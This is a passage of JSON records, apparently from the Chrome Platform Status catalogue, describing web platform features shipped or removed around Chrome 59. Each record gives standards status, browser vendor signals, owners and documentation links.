      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "reillyg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=651767",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The DeviceOrientationEvent and DeviceMotionEvent constructors are defined by the DeviceOrientation Event Specification but were not were not implemented in Chrome. Firefox has already shipped these constructors as specified.",
    "id": 4659236399218688,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/DeviceOrientationEvent",
        "https://developer.mozilla.org/en-US/docs/Web/API/DeviceMotionEvent"
      ],
      "samples": [
        "http://w3c-test.org/orientation-event/idlharness.html"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:50.320590",
      "by": "ericbidelman@google.com"
    },
    "name": "Drop support for embedded credentials in subresource requests.",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/whatwg/fetch/pull/465",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 59
        },
        "owners": [
          "mkwst@chromium.org",
          "tsepez@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 59,
        "flag": false,
        "bug": "https://crbug.com/435547",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We should block requests for subresources that contain embedded credentials (e.g. \"http://ima_user:hunter2@example.com/yay.tiff\"). Such resources would be handled as network errors.",
    "id": 5669008342777856,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:56.787750",
      "by": "ericbidelman@google.com"
    },
    "name": "Drop support for subresources with legacy protocols.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/whatwg/fetch/pull/464",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 59
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://crbug.com/435547",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We should block requests from HTTP/HTTPS documents that target \"legacy\" schemes (e.g. \"ftp://my-awesome-ftp-server.com/yay.tiff\"). That is, the `ftp://` image referenced in https://jsbin.com/petonig/edit?html,output would not load, as the document itself is not served from `ftp://`.",
    "id": 5709390967472128,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-01-19 00:50:45.395490",
      "by": "ericbidelman@google.com"
    },
    "name": "Headless mode",
    "tags": [
      "headless",
      "devtools",
      "testing",
      "automation"
    ],
    "comments": "Available for Linux, Mac and Windows. Allow Window support landed in M59, M60 fixed several bugs.\r\n\r\nPuppeteer is a Node library that works with headless: https://developers.google.com/web/tools/puppeteer/",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 1
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1338004",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "skyostil@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>Headless"
        ],
        "desktop": 59,
        "flag": false,
        "bug": "https://crbug.com/705916",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Headless mode allows running Chromium in a headless/server environment. Expected use cases include loading web pages, extracting metadata (e.g., the DOM) and generating bitmaps from page contents -- using all the modern web platform features provided by Chromium and Blink.\r\n\r\n\r\nTo use headless, start Chrome with a command line flag:\r\n\r\n\r\n$ chrome --headless --remote-debugging-port=9222 https://chromium.org",
    "id": 5678767817097216,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/04/headless-chrome",
        "https://developers.google.com/web/updates/2017/06/headless-karma-mocha-chai",
        "https://chromium.googlesource.com/chromium/src/+/lkgr/headless/README.md"
      ],
      "samples": [
        "https://www.youtube.com/watch?v=n6biclFh0i0"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-09-01 20:09:04.643370",
      "by": "jmedley@google.com"
    },
    "name": "MediaError.message",
    "tags": [
      "MediaError",
      "HTMLMediaElement",
      "HTMLAudioElement",
      "HTMLVideoElement"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/embedded-content.html#dom-mediaerror-message",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/MediaError/message",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "wolenetz@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 59,
        "blink_components": [
          "Blink"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://crbug.com/710617",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/www-archive/2016Dec/0000.html",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The MediaError.message DOMString field provides, if available, any additional vendor-specific error message detail to assist web authors debugging media player errors. The format and content of the string is left to vendors, though it's commonly in the form of a vendor-specific error code followed optionally by a \":\" and further detail about the error. It is populated at the time of MediaError creation.",
    "id": 4996058069336064,
    "resources": {
      "docs": [
        "https://html.spec.whatwg.org/multipage/embedded-content.html#dom-mediaerror-message",
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaError/message"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/media/error-message.html"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-08-17 11:36:06.793950",
      "by": "fbeaufort@google.com"
    },
    "name": "MediaStream Image Capture",
    "comments": "(BEFORE M59: behind a flag: either via command line --enable-blink-features=ImageCapture\r\nor enabling chrome://flags/#enable-experimental-web-platform-features)\r\n\r\nStatus : https://github.com/w3c/mediacapture-image/blob/gh-pages/implementation-status.md",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/mediacapture-image/index.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=888177",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "mcasas@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>ImageCapture"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://crbug.com/603328",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Enable taking pictures from an Image/Video Capture Device.\r\n",
    "id": 4843864737185792,
    "resources": {
      "docs": [
        "http://w3c.github.io/mediacapture-image/index.html"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/image-capture/index.html",
        "https://tinyurl.com/image-capture",
        "https://dandv.github.io/imagecapture",
        "https://simpl.info/ic"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:21:33.958340",
      "by": "ericbidelman@google.com"
    },
    "name": "Navigation preload for service workers",
    "tags": [
      "service",
      "worker",
      "workers",
      "serviceworker",
      "serviceworkers",
      "preload",
      "navigation"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/ServiceWorker/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1290958",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 59
        },
        "owners": [
          "falken@chromium.org",
          "horo@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 59,
        "flag": true,
        "android": 59,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=661071",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/ServiceWorker/issues/920#issuecomment-236251448",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/w3c/ServiceWorker/issues/920#issuecomment-236251448",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature is expected to be enabled by default in Chrome 62. An API that enables the browser to send “preload” network requests for navigations before executing the fetch event handler in the service worker that intercepts the target URL. The worker has access to the preload response inside the fetch event handler. Common use cases would be to respond with the preload response directly, or use it to populate the response. ",
    "id": 5734842339688448,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/02/navigation-preload",
        "https://mattto.github.io/sw/demo/navigation-preload/",
        "https://developer.mozilla.org/en-US/docs/Web/API/NavigationPreloadManager"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-08-07 22:07:54.324100",
      "by": "jmedley@google.com"
    },
    "name": "Partial RTCRtpReceiver and RTCRtpContributingSource support",
    "tags": [
      "RTCPeerConnection extension RTP Media API RTCRtpReceiver RTCRtpContributingSource"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webrtc-pc/#rtp-media-api",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/catalog/?q=specName%3Awebrtc%20rtpreceiver&page=1",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "hbos@chromium.org",
          "guidou@chromium.org",
          "deadbeef@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "http://crbug.com/703122",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/catalog/?q=specName%3Awebrtc%20rtpreceiver&page=1",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The parts of the RTC Media API (https://w3c.github.io/webrtc-pc/#rtp-media-api) that allow keeping track of contributing sources for receiving tracks. RTCPeerConnection extension: getReceivers(). RTCRtpSender support: track, getContributingSources(). RTCRtpContributingSource support: timestamp, source.\r\n\r\nFeature for the rest of the API:\r\nhttps://www.chromestatus.com/feature/5347809238712320",
    "id": 5715393821802496,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/WebRTC_API"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-05-03 21:44:41.584040",
      "by": "jmedley@google.com"
    },
    "name": "Presentation API: Receiver API",
    "comments": "presentation, cast",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/presentation-api/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1184036",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "avayvod@chromium.org",
          "mfoltz@chromium.org",
          "mlamouri@chromium.org",
          "zhaobin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PresentationAPI"
        ],
        "desktop": 59,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=525660",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This is implementing the receiving side of the API in order to allow a web page to be presented and interact with the presenting web page. This is also called 1-UA mode because that mode would allow the browser to render both presenting and receiving pages locally.",
    "id": 5414209298890752,
    "resources": {
      "samples": [
        "https://googlechrome.github.io/samples/presentation-api/",
        "https://googlechromelabs.github.io/presentation-api-samples/photowall/"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-05-15 19:44:39.018770",
      "by": "deadbeef@chromium.org"
    },
    "name": "RTCConfiguration.iceCandidatePoolSize",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/webrtc/#dom-rtcconfiguration-icecandidatepoolsize",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1291894",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "deadbeef@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "ios": 59,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=673395",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Normally, ICE candidates are only gathered after RTCPeerConnection.setLocalDescription is called, because this is the point at which the PeerConnection knows how many ports it needs. The iceCandidatePoolSize member of RTCConfiguration instructs the PeerConnection to gather ICE candidates before this occurs, as a performance optimization. Thus, if setting the local description is delayed (by signaling, for example), interactions with STUN/TURN servers can occur in parallel.",
    "id": 4973817285836800,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:54.941830",
      "by": "ericbidelman@google.com"
    },
    "name": "Referrer Policy Header for CSS",
    "comments": "Previously, a CSS stylesheet would inherit the referrer policy of the document that referenced it. This is now no longer the case. Instead the \"default\" policy will be used unless overwritten via the HTTP header.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/referrer-policy/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/webappsec-referrer-policy/pull/92",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "jochen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://crbug.com/676645",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add the ability for CSS stylesheets to specify their own referrer policy via the HTTP header.",
    "id": 5696724538490880,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-02 18:10:46.675750",
      "by": "mustaq@google.com"
    },
    "name": "Remove \"on-demand\" value for hover/any-hover media queries.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/mediaqueries-4/#mf-interaction",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 59
        },
        "owners": [
          "mustaq@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "ios": 59,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=654861",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/9308676/",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove the support for \"hover: on-demand\" and \"any-hover: on-demand\" media queries. The \"on-demand\" value used to satisfy for the pointing devices that, for example, \"can't normally hover, but will activate hover on a long press\".\r\n\r\nThe \"on-demand\" value for hover/any-hover media queries has been removed from the spec in early 2016.",
    "id": 4719452646014976,
    "resources": {
      "docs": [
        "https://github.com/w3c/csswg-drafts/commit/2078b46218f7462735bb0b5107c9a3e84fb4c4b1"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:21:42.584980",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove FileReaderSync from service workers",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/FileAPI/#FileReaderSync",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/ServiceWorker/issues/735",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 59
        },
        "owners": [
          "mek@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>FileAPI"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=688586",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The Service Worker spec has always had the (non-normative) note that \"any type of synchronous requests must not be initiated inside of a service worker\", to avoid blocking the service worker (as blocking the service worker would block all network requests from controlled pages). However synchronous APIs such as FileReaderSync were still available in service workers. So we'd like to fix that by removing this API from service workers.  This was deprecated in Chrome 57.",
    "id": 5739144722513920,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/FileReaderSync"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:21:52.182580",
      "by": "ericbidelman@google.com"
    },
    "name": "Response.redirected and a new security restriction",
    "comments": "Safari has shipped Fetch API and Response.redirected attribute in Technology Preview. But not shipped Service Worker.\r\n\r\nEdge has shipped Fetch API. But not shipped Response.redirected attribute and Service Worker.\r\n",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://www.fxsitecompat.com/en-CA/docs/2016/fetch-and-request-now-throws-if-redirect-is-detected-when-in-non-follow-redirect-mode/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "horo@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>Network>FetchAPI"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://crbug.com/669363",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=157837",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "- Add .redirected attribute to Response class of Fetch API. Web developers can check it to avoid untrustworthy responses.\r\n- To avoid the risk of open redirectors (https://cwe.mitre.org/data/definitions/601.html) introduce a new security restriction which disallows service workers to respond to requests with a redirect mode different from \"follow\".",
    "id": 6667148676038656,
    "resources": {
      "docs": [
        "Public standards discussion:",
        "https://github.com/whatwg/fetch/issues/79",
        "Spec of Response.redirected:",
        "https://fetch.spec.whatwg.org/#dom-response-redirected",
        "Spec change:",
        "https://github.com/whatwg/fetch/commit/e54f6bd1e75f46cd4b8202f5ee3bfa68e9ded906",
        "MDN:",
        "https://developer.mozilla.org/en-US/docs/Web/API/Response/redirected"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-07-20 22:04:44.371950",
      "by": "jmedley@google.com"
    },
    "name": "Screen.colorDepth and Screen.pixelDepth can return other value than 24",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/cssom-view/#screen",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://crbug.com/701466",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Screen object is no longer required to return 24 for colorDepth and pixelDepth. It enables websites to have a better idea of the number of bits being used to display a color on the screen.",
    "id": 5743005361242112,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Screen",
        "https://developer.mozilla.org/en-US/docs/Web/API/Screen/colorDepth",
        "https://developer.mozilla.org/en-US/docs/Web/API/Screen/pixelDepth"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-08-07 22:07:27.213630",
      "by": "jmedley@google.com"
    },
    "name": "Streams API: Piping",
    "tags": [
      "ReadableStream",
      "TransformStream",
      "streams",
      "pipes"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://streams.spec.whatwg.org/#rs-pipe-through",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "ricea@chromium.org",
          "tyoshino@chromium.org",
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>Network>StreamsAPI"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=668951",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/WebKit/webkit/blob/master/Source/WebCore/Modules/streams/ReadableStream.js",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "ReadableStream's pipeTo() is the standard way to compose readable and writable streams. It reads data from the ReadableStream and writes it to a WritableStream while respecting backpressure.\r\n\r\npipeThrough() is a simple wrapper around pipeTo() that provides elegant syntax for chaining multiple streams.",
    "id": 6067348976959488,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ReadableStream"
      ],
      "samples": [
        "https://streams.spec.whatwg.org/#rs-intro"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-03-01 13:22:33.088500",
      "by": "ricea@chromium.org"
    },
    "name": "Streams API: WritableStream",
    "tags": [
      "ReadableStream",
      "TransformStream",
      "streams",
      "stream"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://streams.spec.whatwg.org/#ws",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1128959",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 59
        },
        "owners": [
          "ricea@chromium.org",
          "tyoshino@chromium.org",
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>Network>StreamsAPI"
        ],
        "desktop": 59,
        "flag": false,
        "android": 59,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=658144",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/streamsapiwritablestream/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=149842",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "WritableStream is part of the Streams API for creating, composing, and consuming streams of data. It is the writable counterpart to ReadableStream, which is already shipping in Chrome. It provides a standard abstraction for writing streaming data to a sink, with built-in backpressure and queuing. This is expected to be on by default in Chrome 59.",
    "id": 5928498656968704,
    "resources": {
      "docs": [
